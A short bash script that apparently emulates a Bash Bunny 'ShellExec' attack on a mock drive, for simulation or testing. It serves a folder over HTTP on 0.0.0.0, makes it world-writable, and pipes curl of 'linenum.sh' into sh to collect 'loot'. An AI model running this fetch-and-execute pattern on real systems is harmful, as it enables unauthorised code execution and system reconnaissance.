#!/bin/bash
# Inspired by: https://github.com/hak5/bashbunny-payloads/blob/27d63ad5a535510b20787cc03850b28bbdb727ee/payloads/library/execution/ShellExec/payload.txt
# Create a web server on the mock BashBunny drive and force the victim to download and execute a script.

# Create mock Bash Bunny USB drive directory
MOCK_BASH_BUNNY_USB_DIR=$HOME/bash_bunny
PAYLOAD_DIR=$MOCK_BASH_BUNNY_USB_DIR/payloads/ShellExec
LOOT_DIR=$MOCK_BASH_BUNNY_USB_DIR/loot/ShellExec
LOOT_FILE=$LOOT_DIR/loot.txt
mkdir -p $MOCK_BASH_BUNNY_USB_DIR $PAYLOAD_DIR $LOOT_DIR

chmod 777 $PAYLOAD_DIR

# Create http server to host payloads
python3 -m http.server 8080 --directory $PAYLOAD_DIR --bind 0.0.0.0 >/dev/null 2>&1 &

# wait until port is listening
while ! nc -z localhost 8080; do sleep 0.2; done

(curl --silent --noproxy '*' "http://localhost:8080/linenum.sh" | sh) > $LOOT_FILE 2>&1
